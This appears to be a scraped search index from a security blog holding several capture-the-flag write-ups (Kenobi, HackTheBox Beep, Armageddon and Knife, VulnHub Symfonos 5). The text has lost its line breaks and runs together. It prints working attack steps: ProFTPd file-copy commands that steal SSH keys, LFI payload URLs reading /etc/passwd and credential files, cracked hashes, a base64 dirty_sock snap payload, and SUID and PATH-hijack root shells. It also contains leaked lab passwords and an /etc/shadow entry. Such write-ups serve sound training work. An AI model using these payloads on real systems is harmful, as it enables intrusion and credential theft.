KENOBI&lt;20&gt; Flags: &lt;unique&gt;&lt;active&gt;| \\x01\\x02__MSBROWSE__\\x02&lt;01&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;00&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;1d&gt; Flags: &lt;unique&gt;&lt;active&gt;| WORKGROUP&lt;1e&gt; Flags: &lt;group&gt;&lt;active&gt;| Statistics:| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00| smb2-time:| date: 2021-11-21T13:00:52|_ start_date: N/A| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 3.1.1:|_ Message signing enabled but not required| p2p-conficker:| Checking for Conficker.C or higher...| Check 1 (port 4604/tcp): CLEAN (Couldn't connect)| Check 2 (port 57188/tcp): CLEAN (Couldn't connect)| Check 3 (port 40874/udp): CLEAN (Failed to receive data)| Check 4 (port 43903/udp): CLEAN (Failed to receive data)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked|_clock-skew: mean: 2h00m09s, deviation: 3h27m51s, median: 8sSMBnmap -Pn -sV -p 139,445 --script=smb-os-discovery,'smb-vuln*','smb-enum*' 10.10.114.180\\\\10.10.114.180\\anonymous:| Type: STYPE_DISKTREE| Comment:| Users: 0| Max Users: &lt;unlimited&gt;| Path: C:\\home\\kenobi\\share| Anonymous access: READ/WRITE| Current user access: READ/WRITE smbclient --no-pass \\\\\\\\10.10.114.180\\\\anonymous get log.txt cat log.txtYour public key has been saved in /home/kenobi/.ssh/id_rsa.pub.The key fingerprint is:SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi We got the path to SSH keys which will be useful later.Exploitation Google or searchsploit ProFTPd 1.3.5 ProFTPd 1.3.5 File Copy Exploit Everything copied to /home/kenobi/share/ using FTP file copy exploit was accessible through /anonymous share using smbclient.FTP Anonymous Login =&gt;ftp&gt; site cpfr /etc/passwd350 File or directory exists, ready for destination nameftp&gt; site cpto /home/kenobi/share/passwd250 Copy successfulftp&gt; site cpfr /etc/samba/smb.conf350 File or directory exists, ready for destination nameftp&gt; site cpto /home/kenobi/share/smb.conf250 Copy successfulftp&gt; site cpfr /home/kenobi/.ssh/id_rsa350 File or directory exists, ready for destination nameftp&gt; site cpto /home/kenobi/share/id_rsa250 Copy successful Then get these files from /anonymous share. smbclient --no-pass \\\\\\\\10.10.114.180\\\\anonymoussmb:\\&gt; ls log.txt, passwd, id_rsa, smb.confsmb:\\&gt; get id_rsa Change the permissions on id_rsa file. chmod 600 id_rsa ssh -i id_rsa kenobi@10.10.114.180 whoami =&gt; kenobiPrivilege Escalation with PATH Manipulation find / -perm -u=s -type f 2&gt;/dev/null There is an odd looking /usr/bin/menu entry. strings /usr/bin/menustrings /usr/bin/menu1. status check2. kernel version3. ifconfig** Enter your choice :curl -I localhostuname -rifconfig It is calling curl, uname, and ifconfig without absolute path. We can create a binary named as either of these 3 in /tmp and add it to path. cp /bin/bash /tmp/curl OR echo \"/bin/bash -p\" &gt; /tmp/curl export PATH=/tmp:$PATH Now when curl is invoked without absolute path (/usr/bin/curl), it will be invoked from /tmp/curlecho $PATH/tmp:/home/kenobi/bin:/home/kenobi/ /usr/bin/menu =&gt; Press 1 as it invoked curl We get a root shell whoami =&gt; root" }, { "title": "Beep - HTB", "url": "/posts/HTB-Beep/", "categories": "Writeups, HackTheBox", "tags": "HTB, vTigerCRM, FreePBX, Elastix", "date": "2021-06-29 08:54:51 +0000", "snippet": "Enumeration nmap -Pn -p- -A 10.129.81.64PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0)| ssh-hostkey: | 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)| ssh-dss AAAAB3NzaC1kc3MAAACBAI04jN+Sn7/9f2k+5UteAWn8KKj3FRGuF4LyeDmo/xxuHgSsdCjYuWtNS8m7stqgNH5edUu8vZ0pzF/quX5kphWg/UOz9weGeGyzde5lfb8epRlTQ2kfbP00l+kq9ztuWaXOsZQGcSR9iKE4lLRJhRCLYPaEbuxKnYz4WhAv4yD5AAAAFQDXgQ9BbvoxeDahe/ksAac2ECqflwAAAIEAiGdIue6mgTfdz/HikSp8DB6SkVh4xjpTTZE8L/HOVpTUYtFYKYj9eG0W1WYo+lGg6SveATlp3EE/7Y6BqdtJNm0RfR8kihoqSL0VzKT7myerJWmP2EavMRPjkbXw32fVBdCGjBqMgDl/QSEn2NNDu8OAyQUVBEHrE4xPGI825qgAAACANnqx2XdVmY8agjD7eFLmS+EovCIRz2+iE+5chaljGD/27OgpGcjdZNN+xm85PPFjUKJQuWmwMVTQRdza6TSp9vvQAgFh3bUtTV3dzDCuoR1D2Ybj9p/bMPnyw62jgBPxj5lVd27LTBi8IAH2fZnct7794Y3Ge+5r4Pm8Qbrpy68=| 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA4SXumrUtyO/pcRLwmvnF25NG/ozHsxSVNRmTwEf7AYubgpAo4aUuvhZXg5iymwTcZd6vm46Y+TX39NQV/yT6ilAEtLbrj1PLjJl+UTS8HDIKl6QgIb1b3vuEjbVjDj1LTq0Puzx52Es0/86WJNRVwh4c9vN8MtYteMb/dE2Azk0SQMtpBP+4Lul4kQrNwl/qjg+lQ7XE+NU7Va22dpEjLv/TjHAKImQu2EqPsC99sePp8PP5LdNbda6KHsSrZXnK9hqpxnwattPHT19D94NHVmMHfea9gXN3NCI3NVfDHQsxhqVtR/LiZzpbKHldFU0lfZYH1aTdBfxvMLrVhasZcw==25/tcp open smtp? syn-ack ttl 63|_smtp-commands: Couldn't establish connection on port 2580/tcp open http syn-ack ttl 63 Apache httpd 2.2.3| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.2.3 (CentOS)|_http-title: Did not follow redirect to https://10.129.81.64/110/tcp open pop3? syn-ack ttl 63111/tcp open rpcbind syn-ack ttl 63 2 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100024 1 941/udp status|_ 100024 1 944/tcp status143/tcp open imap? syn-ack ttl 63443/tcp open ssl/https? syn-ack ttl 63| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit| Public Key type: rsa| Public Key bits: 1024| Signature Algorithm: sha1WithRSAEncryption| Not valid before: 2017-04-07T08:22:08| Not valid after: 2018-04-07T08:22:08| MD5: 621a 82b6 cf7e 1afa 5284 1c91 60c8 fbc8| SHA-1: 800a c6e7 065e 1198 0187 c452 0d9b 18ef e557 a09f| -----BEGIN CERTIFICATE-----| MIIEDjCCA3egAwIBAgICfVUwDQYJKoZIhvcNAQEFBQAwgbsxCzAJBgNVBAYTAi0t| &lt;--SNIP--&gt;| 2ScJ9I/7b4/cPHDOrAKdzdKxEE2oM0cwKxSnYBJk/4aJIw==|_-----END CERTIFICATE-----|_ssl-date: 2021-06-29T08:19:28+00:00; +2s from scanner time.944/tcp open status syn-ack ttl 63 1 (RPC #100024)993/tcp open imaps? syn-ack ttl 63995/tcp open pop3s? syn-ack ttl 633306/tcp open mysql? syn-ack ttl 63|_mysql-info: ERROR: Script execution failed (use -d to debug)|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)|_sslv2: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)4190/tcp open sieve? syn-ack ttl 634445/tcp open upnotifyp? syn-ack ttl 634559/tcp open hylafax? syn-ack ttl 635038/tcp open asterisk syn-ack ttl 63 Asterisk Call Manager 1.110000/tcp open http syn-ack ttl 63 MiniServ 1.570 (Webmin httpd)|_http-favicon: Unknown favicon MD5: 66F8D99F4651EC3A2F6CC9CE5951B4FF| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purpose|media device|PBX|WAP|specialized|printer|storage-miscRunning (JUST GUESSING): Linux 2.6.X|2.4.X (95%), Linksys embedded (94%), Riverbed RiOS (94%), HP embedded (94%), Netgear embedded (94%), Osmosys embedded (93%), Thecus embedded (93%)OS CPE: cpe:/o:linux:linux_kernel:2.6.27 cpe:/o:linux:linux_kernel:2.6.18 cpe:/o:linux:linux_kernel:2.4.32 cpe:/h:linksys:wrv54g cpe:/o:riverbed:rios cpe:/h:netgear:eva9100 cpe:/h:thecus:4200 cpe:/h:thecus:n5500OS fingerprint not ideal because: Missing a closed TCP port so results incompleteAggressive OS guesses: Linux 2.6.27 (95%), Linux 2.6.9 - 2.6.24 (95%), Linux 2.6.9 - 2.6.30 (95%), Linux 2.6.18 (95%), Linux 2.6.20-1 (Fedora Core 5) (95%), Linux 2.6.30 (95%), Linux 2.6.5 (Fedora Core 2) (95%), Linux 2.6.5 - 2.6.12 (95%), Linux 2.6.5-7.283-smp (SuSE Enterprise Server 9, x86) (95%), Linux 2.6.9-22.0.1.EL (CentOS 4.4) (95%)No exact OS matches for host (test conditions non-ideal). Visit 10.129.81.64 in browser and it will redirect to HTTPS on port 443. We can see Elastix running with a login page. If we go to /admin from GoBuster results, we are asked for login details but if we cancel that, we can see FreePBX web page with version 2.8.1.4.Versions OpenSSH 4.3 (nmap) FreePBX 2.8.1.4 (from /admin)Searchsploit searchsploit openssh 4.3 =&gt; mostly username enumeration searchsploit freepbx 2.8 searchsploit elastix FreePBX 2.10.0 / Elastix 2.2.0 =&gt; Remote Code Execution php/webapps/18650.py When I made the necessary changes and ran the exploit script, I kept getting SSL protocol errors. I even imported ssl module but still kept getting those errors. Upon searching more, I came across a post that said Kali has set a minimum version for SSL in openssl.cnf which could be causing such issues on older SSL versions. sslscan 10.129.81.64SSLv2 disabledSSLv3 enabledTLSv1.0 enabledTLSv1.1 disabledTLSv1.2 disabledTLSv1.3 disabled cat /etc/ssl/openssl.cnfMinProtocol = TLSv1.2 sudo nano /etc/ssl/openssl.cnf I had to edit this file on my Kali VM to resolve all the SSL protocol errors I was getting on running the exploit scripts as MinProtocol in openssl.cnf was set to TLSv1.2 while the sslscan showed only TLSv1.0 was enabled on the target and everything else was disabled.sudo nano /etc/ssl/openssl.cnf# MinProtocol = TLSv1.2# CipherString = DEFAULT@SECLEVEL=2MinProtocol = NoneCipherString = DEFAULTNikto nikto -h 10.129.81.64+ Server: Apache/2.2.3 (CentOS)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ Root page / redirects to: https://10.129.81.64/+ Apache/2.2.3 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST+ OSVDB-3268: /icons/: Directory indexing found.+ Server may leak inodes via ETags, header found with file /icons/README, inode: 884871, size: 4872, mtime: Fri Jun 25 01:16:08 2010+ OSVDB-3233: /icons/README: Apache default file found.+ 8724 requests: 0 error(s) and 8 item(s) reported on remote host nikto -h 10.129.81.64:10000 -k, --no-tls-validation =&gt; Skip TLS certificate verification gobuster dir -u https://10.129.81.64/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 40 -k -k to skip TLS certificate verification./admin/modules/themes/images/help/var/mail/static/lang/libs/panel/configs/recordings/vtigercrmExploitation /admin page shows FreePBX /vtigercrm looked interesting. On visiting the page, I could see the version number =&gt; vtiger CRM 5.1.0. searchsploit vtiger crm 5.1 =&gt; LFI vTigerCRM Exploit - LFIhttps://10.129.81.64/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownmail:x:8:12:mail:/var/spool/mail:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bashvcsa:x:69:69:virtual console memory cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bashdbus:x:81:81:System message bus:/:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinManager:/usr/lib/mailman:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinasterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bashrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinspamfilter:x:500:500::/home/spamfilter:/bin/bashhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologinfanis:x:501:501::/home/fanis:/bin/bash When Googling for Elastix password file location, I came across this Elastix forum post that said /etc/amportal.conf stored the credentials. All Configuration Files in FreePBX amportal.conf https://10.129.167.127/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/amportal.conf%00AMPDBHOST=localhostAMPDBENGINE=mysql# AMPDBNAME=asteriskAMPDBUSER=asteriskuser# AMPDBPASS=amp109AMPDBPASS=jEhdIekWmdjEAMPENGINE=asteriskAMPMGRUSER=admin#AMPMGRPASS=amp111AMPMGRPASS=jEhdIekWmdjE#FOPRUN=trueFOPWEBROOT=/var/www/html/panel#FOPPASSWORD=passw0rdFOPPASSWORD=jEhdIekWmdjE Credentials: admin:jEhdIekWmdjE These same credentials work on all the web logins on this target. We now have the Elastix version: Elastix 2.2.0.Finding FreePBX Extension NumberI Googled how to find FreePBX extension as I had no idea what this extension number was and I could not get a reverse shell because of that. So I first Googled and then spent some time inside FreePBX panel clicking around logged in as an admin and found a few different ways to find this FreePBX extension number.Unauthenticated Ways to Find FreePBX ExtensionsThese are mostly from accessing configuration files via LFI. cdr_mysql.confhttps://10.129.167.127/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/cdr_mysql.conf%00hostname = localhostdbname=asteriskcdrdb password = jEhdIekWmdjEuser = asteriskuseruserfield=1;port=3306 ;sock=/tmp/mysql.sock extensions_additional.confThis file was the most important I’d say as it had all the information we needed. Credentials as well as extension number we need for the reverse shell script to work. For extension we need, we have to look under [ext-local].https://10.129.167.127/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/extensions_additional.conf%00ASTETCDIR = /etc/asteriskASTMODDIR = /usr/lib/asterisk/modulesASTVARLIBDIR = /var/lib/asteriskASTAGIDIR = /var/lib/asterisk/agi-binASTSPOOLDIR = /var/spool/asteriskASTRUNDIR = /var/run/asteriskASTLOGDIR = /var/log/asteriskCWINUSEBUSY = trueAMPMGRUSER = adminAMPMGRPASS = jEhdIekWmdjEAMPDBENGINE = mysqlAMPDBHOST = localhostAMPDBNAME = asteriskAMPDBUSER = asteriskuserAMPDBPASS = jEhdIekWmdjEASTVERSION = 1.8.7.0ASTCHANDAHDI = 1#include globals_custom.conf[ext-local]include =&gt; ext-local-customexten =&gt; 233,1,Macro(exten-vm,233,233)exten =&gt; 233,n,Goto(vmret,1)exten =&gt; 233,n,Goto(from-internal,233,1) extensions_custom.confhttps://10.129.167.127/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/extensions_custom.conf%00Of the extensions mentioned here, I tried all of them and 2 happened to work fine with the exploit scripts and got me a reverse shell. [from-internal-custom] =&gt; 1234 (extension) [conferences] =&gt; 5555 (extension); This file contains the contexts the agents login for the module call center.; and contains the context conferences for module conferences of elastix 1.0. [from-internal-custom]\t\t\t\texten =&gt; 1234,1,Playback(demo-congrats)\t\t; extensions can dial 1234exten =&gt; 1234,2,Hangup()exten =&gt; h,1,Hangup()include =&gt; agentlogininclude =&gt; conferencesinclude =&gt; calendar-eventinclude =&gt; weather-wakeup[agentlogin]exten =&gt; _*8888.,1,Set(AGENTNUMBER=${EXTEN:5})exten =&gt; _*8888.,n,NoOp(AgentNumber is ${AGENTNUMBER})exten =&gt; _*8888.,n,AgentLogin(${AGENTNUMBER})exten =&gt; _*8888.,n,Hangup() [mm-announce]exten =&gt; 9999,1,Set(CALLERID(name)=\"MMGETOUT\")exten =&gt; 9999,n,Answerexten =&gt; 9999,n,Playback(conf-will-end-in)exten =&gt; 9999,n,Hangup[conferences];Used by cbEnd script to play end of conference warningexten =&gt; 5555,1,Answerexten =&gt; 5555,n,Wait(3)exten =&gt; 5555,n,CBMysql()exten =&gt; 5555,n,HangupUsing SIPViciousI got to know about this one from Rana Khalil’s HTB Beep writeup. Find extension using svwar.py from sipvicious. sudo apt-get install sipvicious svwar -m INVITE -e100-500 10.129.81.64 =&gt; 233 -m specifies request method and -e specifies an extension or extension range.Authenticated Ways to Find FreePBX ExtensionFrom Asterisk CLII found this forum post regarding API to get a list of FreePBX extensions. While there is no API, someone had mentioned a way to get this information using Asterisk CLI.FreePBX List of ExtensionsFrom RecordingsFrom FreePBX Panel, click on Recordings and log in using the same credentials, then click on Call Monitor.From Elastix PanelShell Access FreePBX Exploit with SSL Change the extension in exploit to 233 or 1234 or 5555.Post ExploitationMySQL mysql -u asteriskuser -pjEhdIekWmdjE" }, { "title": "Armageddon - HTB", "url": "/posts/HTB-Armageddon/", "categories": "Writeups, HackTheBox", "tags": "HTB, Drupal, MySQL", "date": "2021-06-12 06:02:49 +0000", "snippet": "Recon &amp; Enumeration 10.10.10.233 nmap -Pn -p- -A 10.10.10.23310.10.10.233:22 =&gt; OpenSSH 7.4 10.10.10.233:80 =&gt; Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) Server headers from forwarding the same original URL as request through Burp Suite.Server: Apache/2.4.6 (CentOS) PHP/5.4.16X-Powered-By: PHP/5.4.16X-Generator: Drupal 7 (http://drupal.org) whatweb 10.10.10.233http://10.10.10.233 [200 OK] Apache[2.4.6], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[10.10.10.233], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.16], PasswordField[pass], PoweredBy[Arnageddon], Script[text/javascript], Title[Welcome to Armageddon | Armageddon], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.4.16]DroopeScan DroopeScan pip install droopescan droopescan scan drupal -u http://10.10.10.233[+] Plugins found:profile http://10.10.10.233/modules/profile/php http://10.10.10.233/modules/php/image http://10.10.10.233/modules/image/[+] Themes found:seven http://10.10.10.233/themes/seven/garland http://10.10.10.233/themes/garland/[+] Possible version(s):7.56[+] Possible interesting urls found:Default changelog file - http://10.10.10.233/CHANGELOG.txtExploitation searchsploit drupal 7.56 Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - ‘Drupalgeddon2’ Remote Code Execution If you get an error like: cannot load such file - highline/import (LoadError), you just need to install highline with sudo gem install highline to install the missing dependency. I didn’t know if any configuration files stored usernames and passwords on Drupal so I googled that and found out sites/default/settings.php was the file I should take a loot at. cat sites/default/settings.php# line 247$databases = array ( 'default' =&gt; array ( 'default' =&gt; array ( 'database' =&gt; 'drupal', 'username' =&gt; 'drupaluser', 'password' =&gt; 'CQHEy@9M*m23gBVj', 'host' =&gt; 'localhost', 'port' =&gt; '', 'driver' =&gt; 'mysql', 'prefix' =&gt; '', ), ),);# line 293$drupal_hash_salt = '4S4JNzmn8lq4rqErTvcFlV4irAJoNqUmYy_d24JEyns';Dumping Database mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;' mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show tables;' mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select * from users;'uid\tname\tpass\tmail\ttheme\tsignature\tsignature_format\tcreated\taccess\tlogin\tstatus\ttimezone\tlanguage\tpicture\tinit\tdata0\t\t\t\t\t\tNULL\t0\t0\t0\t0\tNULL\t\t0\t\tNULL1\tbrucetherealadmin\t$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt\tadmin@armageddon.eu\t\t\tfiltered_html\t1606998756\t1623161165\t1623160907\t1\tEurope/London\t\t0\tadmin@armageddon.eu\ta:1:{s:7:\"overlay\";i:1;}3\ttest\t$S$D8C20y3tzyN8e40/uXm2ucL/aSg3nyhYwHu0BjLGWqHYMkv6XmvP\ttest@gmail.com\t\t\tfiltered_html\t1623144258\t0\t0\t0\tEurope/London\t\t0\ttest@gmail.com\tNULL4\tfucker\t$S$DDSgB/GK6gUnA/XspYNYKNGy8y0Mgkd6fzAqvgI8K.O66QTLtoC0\tfucker@fuckityfuck.com\t\t\tfiltered_html\t1623145756\t0\t0\t0Europe/London\t\t0\tfucker@fuckityfuck.com\tNULLDumping Hashesbrucetherealadmin =&gt; $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURttest =&gt; $S$D8C20y3tzyN8e40/uXm2ucL/aSg3nyhYwHu0BjLGWqHYMkv6XmvPfucker =&gt; $S$DDSgB/GK6gUnA/XspYNYKNGy8y0Mgkd6fzAqvgI8K.O66QTLtoC0 Lets copy them all to crack.txt and attempt to crack them with hashcat. hashid crack.txt -m =&gt; 7900hashcat -m 7900 -w 3 crack.txt /usr/share/wordlists/rockyou.txt -O$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboobrucetherealadmin:booboo The credentials work not only on the website but also on SSH! ssh brucetherealadmin@10.10.10.233 =&gt; booboo cd /home/brucetherealadmin &amp;&amp; ls cat user.txt2402a902------------cdc5e4307a76Privilege Escalation sudo -lUser brucetherealadmin may run the following commands on armageddon: (root) NOPASSWD: /usr/bin/snap install * GTFOBins sudo snap sudo snap python -c 'print(\"aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw\" + \"A\" * 4256 + \"==\")' | base64 -d &gt; payload.snap chmod +x payload.snap sudo snap install payload.snap --dangerous --devmode This will create a user dirty_sock:dirty_sock with root privileges. su dirty_sock =&gt; dirty_sock cat /root/root.txt83598c--------------7dd817915 cat /etc/shadowroot:$6$OhKUwkvR$.uL.mlYJOz.ubK/FmXouGbU7vCVCG9s00K7R.ny9ryM.vXNdwZhOGCcq7e3XcbA5UpqUp.9eKY4hfLy9m5aU7/:18610:0:99999:7:::" }, { "title": "Knife - HTB", "url": "/posts/HTB-Knife/", "categories": "Writeups, HackTheBox", "tags": "HTB, PHP, Knife", "date": "2021-06-04 02:08:32 +0000", "snippet": "Recon &amp; Enumeration nmap -Pn -p- -A 10.10.10.24210.10.10.242:22 =&gt; OpenSSH 8.2p1 Ubuntu10.10.10.242:80 =&gt; Apache httpd 2.4.41 Wappalyzer shows PHP 8.1 version. Burp Repeater will also reveal the PHP version information in server headers.Exploitation Google: php 8.1 0 dev exploit PHP 8.1.0-dev - ‘User-Agentt’ Remote Code Execution 687da428-----------77b683b1c Get ssh files from /home/james/.ssh ssh-keygen on Kali VM to make your own id_rsa.pub and then paste its content in victim Knife’s /home/james/.ssh/authorized_key file. On Kali: ssh -i ~/.ssh/id_rsa james@10.10.10.242 I can ssh into Knife with my own private id_rsa key as I’ve added my id_rsa.pub key to /home/james/.ssh/authorized_key sudo /usr/bin/knife exec Starts an interactive Knife shell.Privilege Escalation sudo -l shows we can run /usr/bin/knife as root without password. Went to Knife docs and knife has an exec command. sudo /usr/bin/knife exec sudo /usr/bin/knife exec -e 'sudo ruby -e exec \"/bin/bash\";' system('chmod +s /bin/bash') in interactive shell. Press enter and then Ctrl+D to exit. ls -la /bin/bash bash now has SUID bash -p =&gt; root! Try other commands as well like sudo /usr/bin/knife exec -e 'sudo ruby' We can also set SUID on python3' system('chmod +s /usr/bin/python3') in interactive shell, Ctrl+D. And then: python3 -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'" }, { "title": "Symfonos 5 - VulnHub", "url": "/posts/VulnHub-Symfonos5/", "categories": "Writeups, VulnHub", "tags": "VulnHub, LFI, LDAP", "date": "2021-05-30 09:47:41 +0000", "snippet": "Symfonos 5 VulnHub WalkthroughRecon &amp; Enumeration sudo netdiscover -i eth0 -r 10.0.2.0/24 Symfonos IP =&gt; 10.0.2.10Nmap sudo nmap -Pn -sS -p- -A 10.0.2.1010.0.2.10:22 =&gt; OpenSSH 7.9p110.0.2.10:80 =&gt; Apache httpd 2.4.2910.0.2.10:389 =&gt; OpenLDAP 2.2.X - 2.3.X10.0.2.10:636 =&gt; ldapssl? nmap -n -sV --script \"ldap* and not brute\" 10.0.2.10PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)389/tcp open ldap OpenLDAP 2.2.X - 2.3.X| ldap-rootdse:| LDAP Results| &lt;ROOT&gt;| namingContexts: dc=symfonos,dc=local| supportedControl: 2.16.840.1.113730.3.4.18| supportedControl: 2.16.840.1.113730.3.4.2| supportedControl: 1.3.6.1.4.1.4203.1.10.1| supportedControl: 1.3.6.1.1.22| supportedControl: 1.2.840.113556.1.4.319| supportedControl: 1.2.826.0.1.3344810.2.3| supportedControl: 1.3.6.1.1.13.2| supportedControl: 1.3.6.1.1.13.1| supportedControl: 1.3.6.1.1.12| supportedExtension: 1.3.6.1.4.1.4203.1.11.1| supportedExtension: 1.3.6.1.4.1.4203.1.11.3| supportedExtension: 1.3.6.1.1.8| supportedLDAPVersion: 3| supportedSASLMechanisms: SCRAM-SHA-1| supportedSASLMechanisms: SCRAM-SHA-256| supportedSASLMechanisms: GS2-IAKERB| supportedSASLMechanisms: GS2-KRB5| supportedSASLMechanisms: GSS-SPNEGO| supportedSASLMechanisms: GSSAPI| supportedSASLMechanisms: DIGEST-MD5| supportedSASLMechanisms: OTP| supportedSASLMechanisms: NTLM| supportedSASLMechanisms: CRAM-MD5|_ subschemaSubentry: cn=Subschema636/tcp open ldapssl?GoBustergobuster dir -u http://10.0.2.10 -w 